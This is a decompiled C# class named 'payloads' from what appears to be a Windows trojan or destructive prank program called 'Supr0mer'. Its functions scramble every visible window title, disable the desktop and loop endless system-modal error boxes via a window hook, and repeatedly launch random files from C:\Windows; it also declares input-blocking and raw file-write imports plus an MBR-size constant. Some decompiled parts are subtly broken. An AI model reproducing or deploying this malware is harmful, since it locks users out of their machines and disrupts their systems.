using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Supr0mer
{
	// Token: 0x02000007 RID: 7
	internal class payloads
	{
		// Token: 0x0600003B RID: 59
		[DllImport("user32.dll")]
		public static extern bool SetCursorPos(int x, int y);

		// Token: 0x0600003C RID: 60
		[DllImport("user32.dll")]
		public static extern bool BlockInput(bool fBlockIt);

		// Token: 0x0600003D RID: 61
		[DllImport("user32.dll")]
		public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

		// Token: 0x0600003E RID: 62
		[DllImport("user32.dll")]
		public static extern bool EnumWindows(payloads.EnumWindowsProc lpEnumFunc, IntPtr lParam);

		// Token: 0x0600003F RID: 63
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		// Token: 0x06000040 RID: 64
		[DllImport("user32.dll")]
		private static extern bool EnumChildWindows(IntPtr hWndParent, payloads.EnumChildProc lpEnumFunc, IntPtr lParam);

		// Token: 0x06000041 RID: 65
		[DllImport("user32.dll")]
		private static extern int GetWindowTextLength(IntPtr hWnd);

		// Token: 0x06000042 RID: 66
		[DllImport("user32.dll")]
		private static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x06000043 RID: 67
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		private static extern bool SetWindowTextW(IntPtr hWnd, string lpString);

		// Token: 0x06000044 RID: 68
		[DllImport("user32.dll")]
		private static extern IntPtr GetDesktopWindow();

		// Token: 0x06000045 RID: 69
		[DllImport("user32.dll")]
		public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, long uType);

		// Token: 0x06000046 RID: 70
		[DllImport("user32.dll")]
		private static extern int GetWindowTextLengthW(IntPtr hWnd);

		// Token: 0x06000047 RID: 71
		[DllImport("user32.dll")]
		private static extern int EnableWindow(IntPtr hWnd, bool bEnable);

		// Token: 0x06000048 RID: 72
		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000049 RID: 73
		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberBytesWritten, IntPtr lpOverlapped);

		// Token: 0x0600004A RID: 74
		[DllImport("user32.dll")]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x0600004B RID: 75
		[DllImport("user32.dll")]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x0600004C RID: 76
		[DllImport("kernel32.dll")]
		private static extern uint GetCurrentThreadId();

		// Token: 0x0600004D RID: 77
		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowLongPtrW(IntPtr hWnd, int nIndex);

		// Token: 0x0600004E RID: 78
		[DllImport("user32.dll")]
		private static extern IntPtr SetWindowLongPtrW(IntPtr hWnd, int nIndex, IntPtr dwNewLong);

		// Token: 0x0600004F RID: 79
		[DllImport("user32.dll")]
		private static extern IntPtr CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000050 RID: 80
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		private static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, int uType);

		// Token: 0x06000051 RID: 81
		[DllImport("user32.dll")]
		private static extern IntPtr CreateSolidBrush(uint crColor);

		// Token: 0x06000052 RID: 82
		[DllImport("user32.dll")]
		private static extern int FillRect(IntPtr hDC, ref payloads.RECT lprc, IntPtr hbr);

		// Token: 0x06000053 RID: 83
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x06000054 RID: 84
		[DllImport("user32.dll")]
		private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x06000055 RID: 85
		[DllImport("user32.dll")]
		private static extern bool GetClientRect(IntPtr hWnd, out payloads.RECT lpRect);

		// Token: 0x06000056 RID: 86
		[DllImport("user32.dll")]
		private static extern IntPtr SetWindowsHookExW(int idHook, payloads.HookProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000057 RID: 87 RVA: 0x00004360 File Offset: 0x00002560
		public static string unicode
		{
			get
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < amount; i++)
				{
					int num;
					do
					{
						num = payloads.r.Next(32, 255);
					}
					while (char.IsControl((char)num));
					stringBuilder.Append(char.ConvertFromUtf32(num));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000020BD File Offset: 0x000002BD
		public static void randomize_window_titles()
		{
			payloads.EnumWindows(delegate(IntPtr hWnd, IntPtr lParam)
			{
				if (payloads.IsWindowVisible(hWnd))
				{
					int windowTextLength = payloads.GetWindowTextLength(hWnd);
					StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
					payloads.GetWindowTextW(hWnd, stringBuilder, stringBuilder.Capacity);
					string text = stringBuilder.ToString();
					if (!string.IsNullOrEmpty(text))
					{
						payloads.SetWindowTextW(hWnd, payloads.get_unicode(payloads.r.Next(5, 20)));
					}
				}
				return true;
			}, IntPtr.Zero);
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000043B4 File Offset: 0x000025B4
		public static void randomize_desktop()
		{
			IntPtr desktopWindow = payloads.GetDesktopWindow();
			payloads.EnumChildWindows(desktopWindow, delegate(IntPtr hWnd, IntPtr lParam)
			{
				if (payloads.IsWindowVisible(hWnd))
				{
					int windowTextLength = payloads.GetWindowTextLength(hWnd);
					StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
					payloads.GetWindowTextW(hWnd, stringBuilder, stringBuilder.Capacity);
					string text = stringBuilder.ToString();
					if (!string.IsNullOrEmpty(text))
					{
						payloads.SetWindowTextW(hWnd, payloads.get_unicode(payloads.r.Next(5, 20)));
					}
				}
				return true;
			}, IntPtr.Zero);
		}

		// Token: 0x0600005A RID: 90 RVA: 0x000043F4 File Offset: 0x000025F4
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			IntPtr intPtr;
			if (nCode == 5)
			{
				payloads.wnd = new payloads.WndProc(payloads.SubclassProc);
				payloads.oldProc = payloads.GetWindowLongPtrW(wParam, -4);
				payloads.SetWindowLongPtrW(wParam, -4, Marshal.GetFunctionPointerForDelegate(payloads.wnd));
				intPtr = IntPtr.Zero;
			}
			else
			{
				intPtr = payloads.CallNextHookEx(payloads.hHook, nCode, wParam, lParam);
			}
			return intPtr;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004454 File Offset: 0x00002654
		private static IntPtr SubclassProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			IntPtr intPtr;
			if (msg == 15U)
			{
				IntPtr dc = payloads.GetDC(hWnd);
				payloads.RECT rect;
				payloads.GetClientRect(hWnd, out rect);
				IntPtr dc2 = payloads.GetDC(hWnd);
				payloads.FillRect(dc, ref rect, dc2);
				payloads.ReleaseDC(hWnd, dc);
				intPtr = IntPtr.Zero;
			}
			else
			{
				intPtr = payloads.CallWindowProc(payloads.oldProc, hWnd, msg, wParam, lParam);
			}
			return intPtr;
		}

		// Token: 0x0600005C RID: 92 RVA: 0x000044AC File Offset: 0x000026AC
		public static void Unknownerror()
		{
			IntPtr desktopWindow = payloads.GetDesktopWindow();
			payloads.EnableWindow(desktopWindow, false);
			payloads.hook = new payloads.HookProc(payloads.HookCallback);
			for (;;)
			{
				payloads.hHook = payloads.SetWindowsHookExW(5, payloads.hook, IntPtr.Zero, payloads.GetCurrentThreadId());
				string text = payloads.get_unicode(100);
				string text2 = payloads.get_unicode(20);
				payloads.MessageBoxW(IntPtr.Zero, text, text2, 4112);
				payloads.UnhookWindowsHookEx(payloads.hHook);
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00004520 File Offset: 0x00002720
		public static void openTrojan()
		{
			for (;;)
			{
				try
				{
					string[] files = Directory.GetFiles("C:\\Windows", "*.*", SearchOption.AllDirectories);
					Process.Start(files[payloads.r.Next(files.Length)]);
				}
				catch
				{
				}
				Thread.Sleep(payloads.r.Next(100, 2000));
			}
		}

		// Token: 0x04000025 RID: 37
		private const uint MOUSEEVENTF_LEFTDOWN = 2U;

		// Token: 0x04000026 RID: 38
		private const uint MOUSEEVENTF_LEFTUP = 4U;

		// Token: 0x04000027 RID: 39
		private const uint MOUSEEVENTF_RIGHTDOWN = 8U;

		// Token: 0x04000028 RID: 40
		private const uint MOUSEEVENTF_RIGHTUP = 16U;

		// Token: 0x04000029 RID: 41
		private const uint GenericRead = 2147483648U;

		// Token: 0x0400002A RID: 42
		private const uint GenericWrite = 1073741824U;

		// Token: 0x0400002B RID: 43
		private const uint GenericExecute = 536870912U;

		// Token: 0x0400002C RID: 44
		private const uint GenericAll = 268435456U;

		// Token: 0x0400002D RID: 45
		private const uint FileShareRead = 1U;

		// Token: 0x0400002E RID: 46
		private const uint FileShareWrite = 2U;

		// Token: 0x0400002F RID: 47
		private const uint OpenExisting = 3U;

		// Token: 0x04000030 RID: 48
		private const uint FileFlagDeleteOnClose = 1073741824U;

		// Token: 0x04000031 RID: 49
		private const uint MbrSize = 512U;

		// Token: 0x04000032 RID: 50
		private const int WH_CBT = 5;

		// Token: 0x04000033 RID: 51
		private const int HCBT_ACTIVATE = 5;

		// Token: 0x04000034 RID: 52
		private const int WM_PAINT = 15;

		// Token: 0x04000035 RID: 53
		private const int GWL_WNDPROC = -4;

		// Token: 0x04000036 RID: 54
		private const int MB_ICONERROR = 16;

		// Token: 0x04000037 RID: 55
		private const int MB_SYSTEMMODAL = 4096;

		// Token: 0x04000038 RID: 56
		private static IntPtr hHook;

		// Token: 0x04000039 RID: 57
		private static payloads.HookProc hook;

		// Token: 0x0400003A RID: 58
		private static payloads.WndProc wnd;

		// Token: 0x0400003B RID: 59
		private static IntPtr oldProc;

		// Token: 0x0400003C RID: 60
		private static Random rnd = new Random();

		// Token: 0x0400003D RID: 61
		public static Random r = new Random();

		// Token: 0x02000019 RID: 25
		// (Invoke) Token: 0x0600007D RID: 125
		private delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

		// Token: 0x0200001A RID: 26
		// (Invoke) Token: 0x06000081 RID: 129
		public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

		// Token: 0x0200001B RID: 27
		// (Invoke) Token: 0x06000085 RID: 133
		private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x0200001C RID: 28
		// (Invoke) Token: 0x06000089 RID: 137
		private delegate IntPtr WndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x0200001D RID: 29
		private struct RECT
		{
			// Token: 0x04000087 RID: 135
			public int left;

			// Token: 0x04000088 RID: 136
			public int top;

			// Token: 0x04000089 RID: 137
			public int right;

			// Token: 0x0400008A RID: 138
			public int bottom;
		}
	}
}
